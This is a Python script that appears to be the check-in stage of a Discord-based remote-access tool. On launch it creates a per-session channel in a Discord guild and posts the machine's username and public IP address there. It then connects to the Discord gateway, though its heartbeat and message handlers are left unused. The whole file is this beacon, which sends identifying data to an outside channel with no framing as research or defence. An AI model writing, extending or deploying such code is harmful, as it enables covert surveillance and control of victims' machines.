import os, websocket, asyncio, requests, json
from dotenv import load_dotenv

load_dotenv()

SESSION_ID = os.urandom(8).hex()
TOKEN = os.getenv("TOKEN")
API_URL = "https://discord.com/api"
WS_URL = "wss://gateway.discord.gg"
GUILD_ID = os.getenv("GUILD_ID")

async def on_message(ws, message):
    print(message)

async def send_heartbeat(ws, interval):
    while True:
        ws.send(json.dumps({
            "op": 1,
            "d": None
        }))
        await asyncio.sleep(interval)

async def send_message(session, channel_id):
    session.post(f"{API_URL}/channels/{channel_id}/messages", json={
        "embeds": [{
            "title": "New session created",
            "description": "",
            "color": 0xfafafa,
            "fields": [
                {
                    "name": "Session ID",
                    "value":  "```{}```".format(
                        SESSION_ID
                    ),
                    "inline": True
                },
                {
                    "name": "Username",
                    "value": "```{}```".format(
                        os.getenv("USERNAME")
                    ),
                    "inline": True
                },
                {
                    "name": "IP Address",
                    "value": "```{}```".format(
                        requests.get("https://api.ipify.org").text
                    ),
                    "inline": False
                }
            ]
        }]
    })

async def main():
    session = requests.Session()
    session.headers.update({
        "Authorization": f"Bot {TOKEN}"
    })
    channel_id = session.post(f"{API_URL}/guilds/{GUILD_ID}/channels", json={
        "name": SESSION_ID,
        "type": 0
    }).json()["id"]
    await send_message(session, channel_id)
    ws = websocket.create_connection(f"{WS_URL}/?v=6&encoding=json")
    ws.send(json.dumps({
        "op": 2,
        "d": {
            "token": TOKEN,
            "properties": {
                "$os": "linux",
                "$browser": "python",
                "$device": SESSION_ID
            }
        }
    }))

asyncio.run(main())